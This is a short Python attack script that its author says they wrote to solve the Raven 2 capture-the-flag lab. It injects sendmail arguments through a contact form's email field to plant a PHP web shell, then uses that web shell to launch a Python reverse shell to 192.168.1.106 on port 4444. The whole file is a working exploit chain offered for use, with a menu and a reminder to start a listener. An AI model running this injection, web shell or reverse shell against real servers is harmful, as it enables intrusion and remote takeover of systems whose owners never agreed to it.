#Tool that will help you with Raven 2 CTF. I created this while I was working on this CTF. 


import requests

def create_file():
    host = "http://raven.local/contact.php"
    payload='"attacker\\" -oQ/tmp/ -Xhack.php  some"@email.com'
    pay={'action':'submit','name':'hacker','email':payload,'message':'<?php system($_GET["cmd"]); ?>'}
    requests.post(host, data=pay)
    print("File uploaded, go to http://raven.local/hack.php?cmd=ls and have fun !")

def rev_shell():
    host="http://raven.local/hack.php?cmd="
    com = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.106\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    req=requests.post(host+com)
    print("Done !")


def main():
    print("""
    1. Create file
    2. Make shell - don't forget to set listener on port 4444
    """)
    choice=input("Select choice: ")
    if(int(choice)==1):
        create_file()
    elif(int(choice)==2):
        rev_shell()


if __name__ == '__main__':
    main()
